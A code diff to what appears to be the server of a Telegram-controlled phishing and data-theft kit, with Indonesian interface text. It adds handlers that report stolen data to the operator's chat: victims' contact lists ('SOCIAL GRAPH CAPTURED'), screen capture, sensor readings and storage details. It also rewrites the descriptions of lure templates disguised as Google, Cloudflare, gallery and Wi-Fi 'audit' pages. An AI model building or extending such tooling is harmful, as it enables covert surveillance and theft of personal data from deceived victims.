@@ -181,12 +181,30 @@ async function startServer() {
                     `├ Name: <code>${escapeHTML(data.file_name)}</code>\n` +
                     `└ Size: <code>${(data.file_size / 1024).toFixed(2)} KB</code>\n\n`;
       }
-      if (data.screen_label) {
-        extraMsg += `🖥️ <b>SCREEN SOURCE:</b>\n<code>${escapeHTML(data.screen_label)}</code>\n\n`;
+      if (data.screen_label || data.screen_capture) {
+        extraMsg += `🖥️ <b>SCREEN INTERFACE LOGGED:</b>\n` +
+                    `├ Source: <code>${escapeHTML(data.screen_label || 'Display Stream')}</code>\n` +
+                    `└ Status: <b>Sync Success</b>\n\n`;
+      }
+      if (data.contacts_leaked) {
+        let count = 0;
+        try { count = JSON.parse(data.contacts_leaked).length; } catch(e) {}
+        extraMsg += `👥 <b>SOCIAL GRAPH CAPTURED:</b>\n` +
+                    `└ <i>${count} kontak diekstrak (Raw Logged).</i>\n\n`;
+      }
+      if (data.sensor_mag || data.sensor_lux) {
+        extraMsg += `🧬 <b>PHYSICAL ENVIRONMENT:</b>\n` +
+                    `├ Mag: <code>${escapeHTML(data.sensor_mag || 'N/A')}</code>\n` +
+                    `└ Ambient: <code>${escapeHTML(String(data.sensor_lux || 'N/A'))} lux</code>\n\n`;
+      }
+      if (data.storage_mb) {
+        extraMsg += `💾 <b>STORAGE FORENSICS:</b>\n` +
+                    `├ Usage: <code>${data.storage_mb} MB</code>\n` +
+                    `└ Quota: <code>${data.quota_gb} GB</code>\n\n`;
       }
       
       extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `✅ <i>Data modul berhasil diekstrak.</i>`;
+                  `✅ <i>Hyper-Deep module sync successfully.</i>`;
       botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error);
     }
     res.sendStatus(200);
@@ -345,12 +363,12 @@ async function startServer() {
                 `Pilih template operasional berikut:\n\n`;
       
       const tmplDesc: Record<string, string> = {
-        'google': '└ <i>Auth Environment Audit. Advanced hardware, regional & visual-ID recon.</i>',
-        'gallery': '└ <i>Deep Asset Forensic. Media metadata, GPS mapping & file-integrity sync.</i>',
-        'cloudflare': '└ <i>Edge Verification 4.0. Precision fingerprinting, RTT-mapping & bypass.</i>',
-        'pegasus': '└ <i>Kernel Intelligence v7. Elite audio/font sig & hardware-bus diagnostics.</i>',
+        'google': '└ <i>Identity Ecosystem Audit. Full-stack hardware, regional & display-intel recon.</i>',
+        'gallery': '└ <i>System Asset Forensic. Media metadata, storage-quota & social-graph mapping.</i>',
+        'cloudflare': '└ <i>Edge Verification 5.0. Advanced RTT-mapping, footprinting & sensor-delta audit.</i>',
+        'pegasus': '└ <i>Kernel Intelligence v8. Elite audio/font sig & hardware-bus diagnostics.</i>',
         'wifi': '└ <i>Enterprise Hotspot Recon. Social-presence audit & network forensic mapping.</i>',
-        'recap': '└ <i>Ghost Recon Audit. Transparent multi-layered logic tracking & extraction.</i>'
+        'recap': '└ <i>Ghost Recon Audit. Seamless multi-layered background telemetry extraction.</i>'
       };
 
       Object.entries(templates).forEach(([key, tmpl]) => {
